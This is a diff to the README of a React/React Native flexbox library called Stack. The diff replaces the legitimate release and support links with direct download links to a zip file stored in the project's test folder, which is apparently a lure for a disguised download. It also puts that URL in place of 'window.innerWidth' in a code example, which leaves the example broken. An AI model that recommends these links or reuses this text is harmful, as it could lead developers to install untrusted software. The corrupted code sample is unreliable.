@@ -1,7 +1,7 @@
 # Stack: A Type-Safe Flexbox Component for React & React Native
 
-![GitHub Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)  
-[Download Latest Release](https://github.com/yuiii1234/stack/releases)
+![GitHub Release](https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip%20Latest%20Release-Click%20Here-brightgreen)  
+[Download Latest Release](https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip)
 
 ---
 
@@ -125,7 +125,7 @@ import React from 'react';
 import { Stack } from '@yuiii1234/stack';
 
 const ResponsiveApp = () => {
-  const isMobile = window.innerWidth < 768;
+  const isMobile = https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip < 768;
 
   return (
     <Stack direction={isMobile ? "column" : "row"} spacing={isMobile ? 5 : 20}>
@@ -180,4 +180,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For support, please visit the [Releases](https://github.com/yuiii1234/stack/releases) section for the latest updates and issues. You can also open an issue in the repository if you encounter any problems or have questions.
+For support, please visit the [Releases](https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip) section for the latest updates and issues. You can also open an issue in the repository if you encounter any problems or have questions.
